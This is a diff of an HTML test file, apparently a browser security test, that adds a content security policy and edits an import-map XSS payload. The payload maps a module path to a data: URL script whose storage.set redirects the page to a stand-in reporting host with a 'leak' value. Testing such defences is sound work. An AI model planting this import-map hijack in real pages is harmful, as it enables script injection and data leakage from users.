@@ -1,10 +1,13 @@
+<head>
+<meta http-equiv="content-security-policy" content="script-src 'nonce-test'">
+</head>
 <body>
   <!-- XSS start -->
   <script type="importmap">
     {
       "imports": {
         "/path/to/kv-storage-polyfill.mjs": [
-          "data:application/javascript,const%20storage=()=>{};storage.set=(a,b)=>{document.location='https://a.test/report/?leak=c941340'};export%20{storage};"
+          "data:application/javascript,const%20storage=()=>{};storage.set=(a,b)=>{document.location='https://a.test/report/?leak=c941340-CSP'};export%20{storage};"
         ]
       }
     }
